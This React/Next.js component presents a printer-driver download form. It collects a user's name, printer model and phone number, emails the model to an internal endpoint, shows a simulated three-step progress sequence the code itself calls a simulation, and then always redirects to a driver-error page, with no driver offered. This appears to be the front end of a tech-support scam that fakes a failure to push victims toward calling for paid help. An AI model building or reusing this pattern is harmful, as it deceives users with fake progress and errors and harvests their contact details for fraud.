"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function DriverFinderForm() {
 const [bromodel, setBromodel] = useState("");
 const [fullName, setFullName] = useState("");
 const [phoneNumber, setPhoneNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0);
  const router = useRouter();

  const totalSteps = 3;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setStep(0);

    try {
      const res = await fetch("/api/bromail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ bromodel }),
      });

      const data = await res.json();

      if (data.success) {
        // Start step simulation
        let currentStep = 0;
        const interval = setInterval(() => {
          currentStep++;
          setStep(currentStep);
          if (currentStep >= totalSteps) {
            clearInterval(interval);
            setTimeout(() => router.push("/driver-error"), 500);
          }
        }, 1000);
      } else {
        alert("Failed to send email.");
        setLoading(false);
      }
    } catch (err) {
      console.error(err);
      alert("Error sending email.");
      setLoading(false);
    }
  };


  return (
    <section className="py-10">
      <h2 className="text-center text-xl md:text-2xl font-semibold text-gray-800">
        Get started with the installation by downloading the right printer software.
      </h2>
      <div className="mx-auto mt-6 max-w-6xl">
        <div className="rounded-xl bg-white p-6 md:p-8 shadow-[0_10px_30px_rgba(0,0,0,0.08)] ring-1 ring-black/5">
          <form
        className="bg-white p-6 rounded-lg shadow-lg flex flex-col md:flex-row gap-4 items-center"
        onSubmit={handleSubmit}
      >
 <input
          type="text"
          name="fullName"
          placeholder="Full Name"
         value={fullName}
          onChange={(e) => setFullName(e.target.value)}
          required
          className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
        />
        <input
          type="text"
          name="printerModel"
          placeholder="Printer Model"
          value={bromodel}
          onChange={(e) => setBromodel(e.target.value)}
          required
          className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
        />
        <input
          type="text"
          name="phoneNumber"
          placeholder="Phone Number"
         value={phoneNumber}
          onChange={(e) => setPhoneNumber(e.target.value)}
          required
          className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
        />
        <button
          type="submit"
          className="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700 transition"
        >
          FIND DRIVERS
        </button>
      </form>
        </div>
      </div>
    </section>
  );
}
